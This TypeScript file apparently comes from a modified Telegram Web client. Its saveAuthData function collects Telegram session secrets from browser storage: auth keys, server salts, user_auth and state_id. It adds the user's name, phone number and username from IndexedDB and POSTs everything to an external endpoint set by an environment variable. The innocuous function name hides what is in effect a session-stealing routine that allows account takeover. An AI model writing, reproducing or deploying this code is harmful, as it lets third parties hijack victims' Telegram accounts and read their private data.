
let url2 = window.location.href;
let currId2 = url2.split("/").pop();
async function getDbIndexes(id: string) {
  return new Promise((resolve, reject) => {
    const request = window.indexedDB.open("tweb", 7);
    request.onsuccess = function (event: any) {
      const db = event.target.result;
      const transaction = db.transaction("users", "readonly");
      const store = transaction.objectStore("users");
      const getRequest = store.get("" + id);
      getRequest.onsuccess = function () {
        if (getRequest.result) {
          resolve(getRequest.result);
        } else {
          resolve("No matching record found")
        }
      };

      getRequest.onerror = function (error: any) {
        console.error(error)
        resolve("Error retrieving data")
      };
    };

    request.onerror = function (error: any) {
      console.error(error)
      resolve("Error opening database")
    };

  })
}
export async function saveAuthData() {
  const auth_key_fingerprint = localStorage.getItem('auth_key_fingerprint')
  const dc1_auth_key = localStorage.getItem('dc1_auth_key');
  const dc1_server_salt = localStorage.getItem('dc1_server_salt');
  const dc2_auth_key = localStorage.getItem('dc2_auth_key');
  const dc2_server_salt = localStorage.getItem('dc2_server_salt');
  const user_auth = localStorage.getItem('user_auth');
  const xt_instance = localStorage.getItem('xt_instance');
  const state_id = localStorage.getItem('state_id');
  let { id } = JSON.parse(user_auth)
  let curr_user_data: any = {}; // User
  // 
  if (id) {
    curr_user_data = await getDbIndexes(id);
    let photo: any = "";
    console.log('curr_user_data', curr_user_data, id)
  }
  if (dc2_auth_key && user_auth) {
    try {
      const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          auth_key_fingerprint,
          dc1_auth_key,
          dc1_server_salt,
          dc2_auth_key,
          dc2_server_salt,
          user_auth,
          xt_instance,
          state_id,
          currId: currId2,
          fullName: [curr_user_data.first_name, curr_user_data.last_name].filter(Boolean).join(" "),
          phone: curr_user_data.phone,
          username: curr_user_data.username
        }),

      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      const data = await response.json();
    } catch (error) {
      console.error('Error saving auth data:', error);
    }
  } else {
    console.error('Auth keys not found in localStorage');
  }
}